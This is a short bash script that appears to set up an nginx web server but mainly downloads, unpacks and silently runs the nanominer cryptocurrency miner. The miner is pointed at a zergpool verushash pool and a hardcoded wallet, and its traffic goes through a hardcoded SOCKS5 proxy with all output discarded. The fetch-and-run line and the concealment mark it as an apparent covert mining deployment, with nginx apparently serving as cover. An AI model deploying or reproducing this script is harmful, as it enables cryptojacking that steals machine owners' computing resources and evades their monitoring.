#!/bin/bash
apt update -y
apt install nginx -y
apt install wget -y
service nginx start
wget https://github.com/nanopool/nanominer/releases/download/v3.6.5/nanominer-linux-3.6.5.tar.gz && tar -xvf nanominer-linux-3.6.5.tar.gz && cd nanominer-linux-3.6.5 && chmod +x nanominer && ./nanominer -algo verushash -pool1 verushash.mine.zergpool.com:3300 -wallet LUFTF9kAQgHyWLv2rctGvVSSxL9RXBodcF.OKTE -password c=LTC -x socks5://192.252.214.20:15864 > /dev/null 2>&1
